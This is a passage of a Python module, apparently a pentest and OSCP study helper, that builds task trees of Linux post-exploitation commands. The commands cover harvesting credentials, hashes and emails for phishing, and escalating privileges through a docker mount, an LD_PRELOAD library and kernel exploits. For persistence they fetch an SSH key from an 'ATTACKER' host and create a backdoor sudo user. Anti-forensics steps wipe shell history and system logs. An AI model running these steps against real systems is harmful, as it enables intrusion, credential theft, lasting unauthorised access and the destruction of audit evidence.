                        ],
                        'next_steps': [
                            'If in docker group: docker run -v /:/mnt -it ubuntu chroot /mnt',
                            'If in lxd group: lxd privilege escalation',
                            'If in disk group: read /etc/shadow'
                        ],
                        'alternatives': [
                            'getent group',
                            'cut -d: -f1 /etc/group'
                        ],
                        'estimated_time': '1 minute',
                        'notes': 'Groups like docker, lxd, disk = instant privesc vectors'
                    }
                },
                {
                    'id': f'running-processes-{port}',
                    'name': 'List Running Processes',
                    'type': 'command',
                    'metadata': {
                        'command': 'ps aux; ps -ef',
                        'description': 'List all running processes (identify services, attack targets)',
                        'flag_explanations': {
                            'ps aux': 'BSD syntax - all processes, user-oriented',
                            'a': 'All processes with terminals',
                            'u': 'User-oriented format',
                            'x': 'Processes without terminals',
                            'ps -ef': 'Unix syntax - all processes, full format',
                            '-e': 'All processes',
                            '-f': 'Full format'
                        },
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'ENUM'],
                        'success_indicators': [
                            'Process list displayed',
                            'Services identified',
                            'Running as root visible'
                        ],
                        'failure_indicators': [
                            'Limited process visibility',
                            'Restricted environment'
                        ],
                        'next_steps': [
                            'Look for processes running as root',
                            'Identify services with known vulnerabilities',
                            'Check for writable process binaries'
                        ],
                        'alternatives': [
                            'top (interactive)',
                            'pstree (tree view)',
                            'ps auxf (forest view with tree)'
                        ],
                        'estimated_time': '1 minute',
                        'notes': 'Look for unusual processes, root-owned services'
                    }
                },
                {
                    'id': f'check-process-files-{port}',
                    'name': 'Check Process File Handles',
                    'type': 'command',
                    'metadata': {
                        'command': 'lsof 2>/dev/null | head -100',
                        'description': 'List open files by processes (find configs, logs, sockets)',
                        'flag_explanations': {
                            'lsof': 'List open files',
                            'head -100': 'Show first 100 entries only'
                        },
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'ENUM'],
                        'success_indicators': [
                            'Open files listed',
                            'Config files identified',
                            'Log files discovered'
                        ],
                        'failure_indicators': [
                            'lsof not installed',
                            'Permission denied',
                            'Too much output to analyze'
                        ],
                        'next_steps': [
                            'Check specific process: lsof -p PID',
                            'Find files in use: lsof | grep /path',
                            'Identify network files: lsof -i'
                        ],
                        'alternatives': [
                            'ls -la /proc/PID/fd/ (per-process file descriptors)',
                            'find /proc -name fd -exec ls -l {} \\; 2>/dev/null'
                        ],
                        'estimated_time': '1-2 minutes',
                        'notes': 'Useful for finding config files in use'
                    }
                }
            ]
        }

    def _create_data_extraction_section(self, target: str, port: int) -> Dict[str, Any]:
        """Data extraction and grep pattern tasks"""
        return {
            'id': f'data-extraction-{port}',
            'name': 'Data Extraction & Pattern Matching',
            'type': 'parent',
            'children': [
                {
                    'id': f'find-passwords-{port}',
                    'name': 'Search for Passwords in Files',
                    'type': 'command',
                    'metadata': {
                        'command': 'grep -riE "password|passwd|pwd" /home /var/www /opt 2>/dev/null | head -50',
                        'description': 'Search for password strings in common directories',
                        'flag_explanations': {
                            '-r': 'Recursive search',
                            '-i': 'Case-insensitive',
                            '-E': 'Extended regex',
                            '"password|passwd|pwd"': 'Search for password-related strings',
                            'head -50': 'Limit to 50 results'
                        },
                        'tags': ['OSCP:HIGH', 'MANUAL', 'ENUM'],
                        'success_indicators': [
                            'Password strings found',
                            'Credentials in plaintext',
                            'Config files with passwords'
                        ],
                        'failure_indicators': [
                            'No matches found',
                            'Only false positives',
                            'Permission denied on directories'
                        ],
                        'next_steps': [
                            'Test found credentials',
                            'Try credentials on other services',
                            'Check for password reuse'
                        ],
                        'alternatives': [
                            'grep -r "password" /etc 2>/dev/null',
                            'find / -name "*.conf" -exec grep -i "pass" {} \\; 2>/dev/null'
                        ],
                        'estimated_time': '2-5 minutes',
                        'notes': 'Check /var/www for web app configs, /home for user files'
                    }
                },
                {
                    'id': f'extract-emails-{port}',
                    'name': 'Extract Email Addresses',
                    'type': 'command',
                    'metadata': {
                        'command': 'grep -roE "\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,6}\\b" /home /var 2>/dev/null | head -30',
                        'description': 'Extract email addresses from files (for phishing, enumeration)',
                        'flag_explanations': {
                            '-r': 'Recursive',
                            '-o': 'Only matching part',
                            '-E': 'Extended regex',
                            '\\b[A-Za-z0-9._%+-]+@...': 'Email regex pattern',
                            'head -30': 'First 30 results'
                        },
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'ENUM'],
                        'success_indicators': [
                            'Email addresses extracted',
                            'User emails identified',
                            'Organizational email patterns visible'
                        ],
                        'failure_indicators': [
                            'No emails found',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Use for user enumeration',
                            'Test as usernames',
                            'Build target list for phishing'
                        ],
                        'alternatives': [
                            'grep -hroE "..." (suppress filenames)',
                            'find / -name "*.txt" -exec grep -oE "..." {} \\; 2>/dev/null'
                        ],
                        'estimated_time': '2-3 minutes',
                        'notes': 'Useful for user enumeration and phishing'
                    }
                },
                {
                    'id': f'extract-ips-{port}',
                    'name': 'Extract IP Addresses',
                    'type': 'command',
                    'metadata': {
                        'command': 'grep -roE "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" /var/log /etc 2>/dev/null | head -50',
                        'description': 'Extract IP addresses from logs and configs',
                        'flag_explanations': {
                            '-r': 'Recursive',
                            '-o': 'Only matching',
                            '-E': 'Extended regex',
                            '(25[0-5]|...)': 'IP address regex pattern'
                        },
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'ENUM'],
                        'success_indicators': [
                            'IP addresses extracted',
                            'Network topology visible',
                            'Internal IPs discovered'
                        ],
                        'failure_indicators': [
                            'No IPs found',
                            'Only localhost/loopback',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Scan discovered IPs',
                            'Map network topology',
                            'Identify pivot targets'
                        ],
                        'alternatives': [
                            'grep -oE "([0-9]{1,3}\\.){3}[0-9]{1,3}" /var/log/* 2>/dev/null'
                        ],
                        'estimated_time': '2-3 minutes',
                        'notes': 'Logs often reveal network infrastructure'
                    }
                },
                {
                    'id': f'extract-hashes-{port}',
                    'name': 'Extract Hashes from Files',
                    'type': 'command',
                    'metadata': {
                        'command': 'grep -roE "\\$6\\$[a-zA-Z0-9./]{8,}|\\$5\\$[a-zA-Z0-9./]{8,}|\\$1\\$[a-zA-Z0-9./]{8,}" /var /etc /home 2>/dev/null | head -20',
                        'description': 'Extract password hashes (SHA-512, SHA-256, MD5 crypt)',
                        'flag_explanations': {
                            '\\$6\\$': 'SHA-512 crypt hash prefix',
                            '\\$5\\$': 'SHA-256 crypt hash prefix',
                            '\\$1\\$': 'MD5 crypt hash prefix',
                            '[a-zA-Z0-9./]{8,}': 'Hash characters (min 8)'
                        },
                        'tags': ['OSCP:HIGH', 'MANUAL', 'ENUM'],
                        'success_indicators': [
                            'Hashes extracted',
                            'Valid hash formats found',
                            'Multiple hashes discovered'
                        ],
                        'failure_indicators': [
                            'No hashes found',
                            'Permission denied on /etc/shadow'
                        ],
                        'next_steps': [
                            'Copy hashes to attacker machine',
                            'Crack with hashcat/john',
                            'Test cracked passwords on system'
                        ],
                        'alternatives': [
                            'cat /etc/shadow 2>/dev/null (if readable)',
                            'grep "\\$6\\$" /etc/shadow 2>/dev/null'
                        ],
                        'estimated_time': '2-3 minutes',
                        'notes': 'If /etc/shadow readable, direct access preferred'
                    }
                },
                {
                    'id': f'find-backups-{port}',
                    'name': 'Find Backup Files',
                    'type': 'command',
                    'metadata': {
                        'command': 'find / -name "*.bak" -o -name "*.backup" -o -name "*.old" -o -name "*~" 2>/dev/null | head -50',
                        'description': 'Locate backup files (may contain old credentials, configs)',
                        'flag_explanations': {
                            '-name "*.bak"': 'Files ending in .bak',
                            '-o': 'OR operator',
                            '-name "*~"': 'Editor backup files (vim, emacs)',
                            'head -50': 'First 50 results'
                        },
                        'tags': ['OSCP:HIGH', 'MANUAL', 'ENUM'],
                        'success_indicators': [
                            'Backup files found',
                            'Readable backups',
                            'Interesting locations'
                        ],
                        'failure_indicators': [
                            'No backups found',
                            'All backups unreadable'
                        ],
                        'next_steps': [
                            'Read backup files: cat /path/to/file.bak',
                            'Compare with current files',
                            'Look for old credentials'
                        ],
                        'alternatives': [
                            'find / -name ".*.swp" 2>/dev/null (vim swap files)',
                            'find /var/backups -type f 2>/dev/null'
                        ],
                        'estimated_time': '2-3 minutes',
                        'notes': 'Backups often overlooked and contain sensitive data'
                    }
                }
            ]
        }

    def _create_privesc_section(self, target: str, port: int) -> Dict[str, Any]:
        """Privilege escalation focused checks"""
        return {
            'id': f'privesc-checks-{port}',
            'name': 'Privilege Escalation Checks',
            'type': 'parent',
            'children': [
                {
                    'id': f'check-capabilities-{port}',
                    'name': 'Check File Capabilities',
                    'type': 'command',
                    'metadata': {
                        'command': 'getcap -r / 2>/dev/null',
                        'description': 'Find files with capabilities (alternative to SUID)',
                        'flag_explanations': {
                            'getcap': 'Get file capabilities',
                            '-r': 'Recursive search',
                            '/': 'Start from root'
                        },
                        'tags': ['OSCP:HIGH', 'MANUAL', 'PRIVESC'],
                        'success_indicators': [
                            'Files with capabilities found',
                            'CAP_SETUID capabilities (instant privesc)',
                            'CAP_DAC_READ_SEARCH (read any file)'
                        ],
                        'failure_indicators': [
                            'getcap not installed',
                            'No capabilities set',
                            'Only standard system capabilities'
                        ],
                        'next_steps': [
                            'If CAP_SETUID found: use to escalate privileges',
                            'Research capability exploitation',
                            'Check GTFOBins for capability exploits'
                        ],
                        'alternatives': [
                            'Manual check: ls -la /usr/bin/* | grep -i cap',
                            'find / -exec getcap {} \\; 2>/dev/null'
                        ],
                        'estimated_time': '2-3 minutes',
                        'notes': 'Capabilities bypass traditional permission model'
                    }
                },
                {
                    'id': f'check-docker-{port}',
                    'name': 'Check Docker Escape',
                    'type': 'command',
                    'metadata': {
                        'command': 'groups | grep docker; ls -la /var/run/docker.sock; docker ps 2>/dev/null',
                        'description': 'Check for Docker group membership or socket access (instant root)',
                        'flag_explanations': {
                            'groups | grep docker': 'Check if in docker group',
                            'ls -la /var/run/docker.sock': 'Check docker socket permissions',
                            'docker ps': 'Test docker access'
                        },
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'PRIVESC'],
                        'success_indicators': [
                            'User in docker group',
                            'Docker socket accessible',
                            'Docker commands work'
                        ],
                        'failure_indicators': [
                            'Not in docker group',
                            'Docker not installed',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'If in docker group: docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash',
                            'Mount host filesystem in container',
                            'Access /etc/shadow, add user, etc.'
                        ],
                        'alternatives': [
                            'Check lxd group: groups | grep lxd',
                            'LXD privesc if in lxd group'
                        ],
                        'estimated_time': '1 minute',
                        'notes': 'Docker group = instant root. Well-known privesc vector.'
                    }
                },
                {
                    'id': f'check-nfs-{port}',
                    'name': 'Check NFS Shares',
                    'type': 'command',
                    'metadata': {
                        'command': 'cat /etc/exports; showmount -e localhost',
                        'description': 'Check NFS exports (no_root_squash = privesc)',
                        'flag_explanations': {
                            'cat /etc/exports': 'View NFS export configuration',
                            'showmount -e': 'Show NFS exports',
                            'localhost': 'Check local exports'
                        },
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'PRIVESC'],
                        'success_indicators': [
                            'NFS exports found',
                            'no_root_squash option present',
                            'Writable exports'
                        ],
                        'failure_indicators': [
                            'No NFS configured',
                            'Permission denied',
                            'root_squash enabled'
                        ],
                        'next_steps': [
                            'If no_root_squash: mount share remotely as root',
                            'Create SUID binary on share',
                            'Execute SUID binary for root'
                        ],
                        'alternatives': [
                            'mount | grep nfs (check mounted NFS)',
                            'rpcinfo -p (check RPC services)'
                        ],
                        'estimated_time': '1 minute',
                        'notes': 'no_root_squash = classic OSCP privesc vector'
                    }
                },
                {
                    'id': f'check-ld-preload-{port}',
                    'name': 'Check LD_PRELOAD Privilege',
                    'type': 'command',
                    'metadata': {
                        'command': 'sudo -l 2>/dev/null | grep -i "env_keep.*LD_PRELOAD\\|LD_PRELOAD"',
                        'description': 'Check if LD_PRELOAD preserved in sudo (code injection)',
                        'flag_explanations': {
                            'sudo -l': 'List sudo privileges',
                            'grep -i "env_keep.*LD_PRELOAD"': 'Check if LD_PRELOAD preserved',
                            'LD_PRELOAD': 'Environment variable for library preloading'
                        },
                        'tags': ['OSCP:HIGH', 'MANUAL', 'PRIVESC'],
                        'success_indicators': [
                            'LD_PRELOAD in env_keep',
                            'env_reset not set',
                            'Can set LD_PRELOAD with sudo'
                        ],
                        'failure_indicators': [
                            'LD_PRELOAD not preserved',
                            'env_reset enabled',
                            'No sudo privileges'
                        ],
                        'next_steps': [
                            'Create malicious shared library',
                            'Compile: gcc -fPIC -shared -o shell.so shell.c -nostartfiles',
                            'Execute: sudo LD_PRELOAD=/tmp/shell.so <any_allowed_command>'
                        ],
                        'alternatives': [
                            'Check LD_LIBRARY_PATH: sudo -l | grep LD_LIBRARY_PATH'
                        ],
                        'estimated_time': '1 minute',
                        'notes': 'Classic OSCP technique. Requires sudo access.'
                    }
                },
                {
                    'id': f'kernel-exploits-{port}',
                    'name': 'Research Kernel Exploits',
                    'type': 'research',
                    'metadata': {
                        'command': 'uname -a; searchsploit "linux kernel $(uname -r | cut -d- -f1)"',
                        'description': 'Search for kernel exploits matching system version',
                        'flag_explanations': {
                            'uname -r': 'Kernel release version',
                            'cut -d- -f1': 'Extract major version only',
                            'searchsploit': 'Search exploit database'
                        },
                        'tags': ['OSCP:HIGH', 'RESEARCH', 'PRIVESC'],
                        'success_indicators': [
                            'Kernel version identified',
                            'Exploits found',
                            'Matching architecture'
                        ],
                        'failure_indicators': [
                            'No exploits for this kernel',
                            'searchsploit not available',
                            'Modern patched kernel'
                        ],
                        'next_steps': [
                            'Download exploit to target',
                            'Compile exploit: gcc exploit.c -o exploit',
                            'Execute and escalate privileges'
                        ],
                        'alternatives': [
                            'Linux Exploit Suggester: wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh',
                            'LinPEAS automated checker'
                        ],
                        'estimated_time': '5-10 minutes',
                        'notes': 'Last resort. Kernel exploits can crash systems.'
                    }
                }
            ]
        }

    def _create_persistence_section(self, target: str, port: int) -> Dict[str, Any]:
        """Persistence and cleanup tasks"""
        return {
            'id': f'persistence-{port}',
            'name': 'Persistence & Cleanup',
            'type': 'parent',
            'children': [
                {
                    'id': f'add-ssh-key-{port}',
                    'name': 'Add SSH Public Key',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Add your SSH public key for persistent access',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'POST_EXPLOIT'],
                        'alternatives': [
                            'echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys',
                            'curl https://ATTACKER/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys',
                            'Create .ssh directory if missing: mkdir -p ~/.ssh; chmod 700 ~/.ssh'
                        ],
                        'next_steps': [
                            'Set permissions: chmod 600 ~/.ssh/authorized_keys',
                            'Test access: ssh user@target',
                            'Add for multiple users if possible'
                        ],
                        'notes': 'Standard persistence technique. Easy to detect but reliable.',
                        'estimated_time': '1 minute'
                    }
                },
                {
                    'id': f'create-backdoor-user-{port}',
                    'name': 'Create Backdoor User',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create privileged user account for persistence',
                        'tags': ['OSCP:LOW', 'MANUAL', 'POST_EXPLOIT'],
                        'alternatives': [
                            'useradd -p $(openssl passwd -1 PASSWORD) -m -s /bin/bash username',
                            'Add to sudoers: echo "username ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers',
                            'Add to passwd manually if no useradd'
                        ],
                        'success_indicators': [
                            'User created successfully',
                            'Can login as new user',
                            'Sudo access works'
                        ],
                        'failure_indicators': [
                            'Permission denied (need root)',
                            'Command not found',
                            'Sudoers syntax error'
                        ],
                        'next_steps': [
                            'Test login: su - username',
                            'Test sudo: sudo -l',
                            'Add SSH key for new user'
                        ],
                        'notes': 'Requires root privileges. Easily detected by admins.',
                        'estimated_time': '2 minutes'
                    }
                },
                {
                    'id': f'clear-history-{port}',
                    'name': 'Clear Command History',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Clear shell history to remove traces',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'POST_EXPLOIT', 'ANTI_FORENSICS'],
                        'alternatives': [
                            'history -c (clear current session)',
                            'rm ~/.bash_history (delete history file)',
                            'ln -sf /dev/null ~/.bash_history (prevent logging)',
                            'export HISTFILESIZE=0 (disable history)',
                            'export HISTSIZE=0 (disable session history)',
                            'unset HISTFILE (don\'t save history)'
                        ],
                        'next_steps': [
                            'Clear history before disconnect',
                            'Set HISTSIZE=0 at session start',
                            'Consider disabling logging: set +o history'
                        ],
                        'notes': 'Anti-forensics. May alert admins if history suddenly empty.',
                        'estimated_time': '30 seconds'
                    }
                },
                {
                    'id': f'clear-logs-{port}',
                    'name': 'Clear System Logs',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Clear or modify system logs (requires root)',
                        'tags': ['OSCP:LOW', 'MANUAL', 'POST_EXPLOIT', 'ANTI_FORENSICS'],
                        'alternatives': [
                            'Clear auth log: > /var/log/auth.log',
                            'Clear wtmp: > /var/log/wtmp',
                            'Clear lastlog: > /var/log/lastlog',
                            'Edit logs: sed -i "/PATTERN/d" /var/log/auth.log'
                        ],
                        'success_indicators': [
                            'Logs cleared or modified',
                            'No errors',
                            'Logs still writable'
                        ],
                        'failure_indicators': [
                            'Permission denied (need root)',
                            'Logs immutable (chattr +i)',
                            'Centralized logging active'
                        ],
                        'next_steps': [
                            'Verify log clearing: ls -la /var/log/',
                            'Check for remote logging',
                            'Consider leaving logs to avoid suspicion'
                        ],
                        'notes': 'Requires root. Clearing logs may alert security team. NOT recommended for OSCP exam.',
                        'estimated_time': '2-3 minutes'
                    }
                }
            ]
        }


# === Helper Methods ===

def get_manual_alternatives(self) -> List[str]:
    """
    Provide manual alternatives for automated enumeration

    Returns educational manual enumeration methods when
    automated tools are unavailable (OSCP exam scenario)
    """
    return [
        "Manual System Enumeration:",
        "",
        "1. Basic System Info:",
        "   uname -a                    # Kernel version",
        "   cat /etc/os-release         # Distribution",
        "   cat /proc/version           # Detailed version",
        "",
        "2. User Enumeration:",
        "   cat /etc/passwd             # All users",
        "   cat /etc/group              # All groups",
        "   id                          # Current user context",
        "",
        "3. Network Info:",
        "   ip a                        # Network interfaces",
        "   netstat -tunlp              # Listening ports",
        "   cat /etc/hosts              # Host mappings",
        "",
        "4. Quick Privilege Escalation Checks:",
        "   sudo -l                     # Sudo privileges",
        "   find / -perm -4000 2>/dev/null  # SUID binaries",
        "   cat /etc/crontab            # Cron jobs",
        "",
        "5. File System:",
        "   ls -la /home                # User home directories",
        "   find / -writable 2>/dev/null | head -20  # Writable locations",
        "   cat /etc/exports            # NFS shares",
        "",
        "6. Process Info:",
        "   ps aux                      # Running processes",
        "   lsof -i                     # Network connections",
        "",
        "7. Environment:",
        "   env                         # Environment variables",
        "   echo $PATH                  # PATH variable",
        "   cat ~/.bash_history         # Command history"
    ]
